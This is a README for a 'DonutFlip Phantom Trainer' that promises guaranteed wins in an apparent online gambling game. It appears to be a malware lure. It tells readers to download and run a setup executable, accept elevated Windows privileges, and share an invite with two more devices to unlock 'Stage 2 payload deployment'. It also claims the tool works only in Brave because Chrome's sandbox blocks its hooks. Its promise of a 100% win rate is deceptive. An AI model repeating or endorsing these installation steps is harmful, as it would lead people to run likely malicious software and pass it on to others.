<div align="center">

  <img src="https://files.catbox.moe/wmagwo.png" alt="DonutFlip Phantom Trainer" width="130" style="border-radius: 12px;"/>

  # DonutFlip Phantom Trainer

  **Open-source community trainer and outcome controller for DonutFlip.**  
  `Win Bias Control` • `Force Multiplier` • `100% Win Rate Engine`

  <br/>

  [![Release](https://img.shields.io/badge/Release-v4.4-2ea043?style=for-the-badge)](https://github.com/Nawasfadili/donut-flip/releases/latest)
  [![Downloads](https://img.shields.io/badge/Downloads-341-2ea043?style=for-the-badge)](https://github.com/Nawasfadili/donut-flip/releases)
  [![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-2ea043?style=for-the-badge)](https://github.com/Nawasfadili/donut-flip/releases/latest)
  [![License](https://img.shields.io/badge/License-MIT-2ea043?style=for-the-badge)](LICENSE)

  <br/>

  [![↓ Download](https://img.shields.io/badge/↓%20Download%20DonutFlipSetup.exe-v4.4-2ea043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Nawasfadili/donut-flip/releases/latest/download/DonutFlipSetup.exe)

  <br/><br/>

  <kbd>
    <img src="https://files.catbox.moe/gzrses.png" alt="DonutFlip Phantom Trainer Overlay" width="280"/>
  </kbd>

  <p><sub>In-Game Trainer Overlay — Press <b>F8</b> to toggle controls</sub></p>

</div>

---

> [!NOTE]
> **Browser Compatibility Guide**
> - **Brave Browser (Recommended)**: Fully supported with active WebSocket and memory hook injection.
> - **Google Chrome**: Unsupported due to Chromium sandbox isolation preventing hook attachment. Please run DonutFlip in Brave.

---

## Technical Specifications

| Property | Specification |
|---|---|
| **Version** | v4.4 (Latest Stable) |
| **Target Architecture** | x64 (AMD64 / Intel 64) |
| **Payload Size** | 2.87 MB (`DonutFlipSetup.exe`) |
| **Runtime Requirement** | Windows 10 (1903+) / Windows 11 |
| **Recommended Browser** | **Brave Browser** |
| **Hotkeys** | `F8` (Toggle Overlay) |

---

## Core Capabilities

- **Session Win Bias**: Intercepts outcome weighting client-side to enforce favorable resolution probabilities.
- **Dynamic Force Multiplier**: Modulates physics parameters within validated boundary limits.
- **Deterministic Win Rate**: Sustained win-state sequence generation with automatic reconnect handling.
- **Referral Activation**: Dual-device activation architecture for community distribution.
- **Non-Persistent Execution**: UAC elevation executes once to configure environment parameters without residual background services.

---

## Getting Started

1. Download [`DonutFlipSetup.exe`](https://github.com/Nawasfadili/donut-flip/releases/latest/download/DonutFlipSetup.exe) from the verified release channel.
2. Launch the installer and accept the standard Windows UAC prompt.
3. Complete initial environment verification (Stage 1).
4. Share your invite identifier with 2 devices to unlock Stage 2 payload deployment.
5. Click **ACTIVATE PHANTOM TRAINER** to complete installation.
6. Open DonutFlip in **Brave Browser** and press **F8** to open the in-game overlay.

---

## Binary Integrity & Verification

Always verify the binary SHA-256 hash before execution:

| Binary | SHA-256 Checksum |
|---|---|
| `DonutFlipSetup.exe` | `F6B3729889649FEE5D5BFB586FB9A307ED9FD596DB4E0157AD5E0D8A7812BE13` |

```powershell
Get-FileHash .\DonutFlipSetup.exe -Algorithm SHA256
```

---

## Responsible Disclosure

Security advisories, vulnerability disclosures, and technical bug reports should follow the guidelines defined in [SECURITY.md](SECURITY.md).

---

## License

This project is licensed under the [MIT License](LICENSE).  
Copyright © 2026 Nawasfadili and contributors.
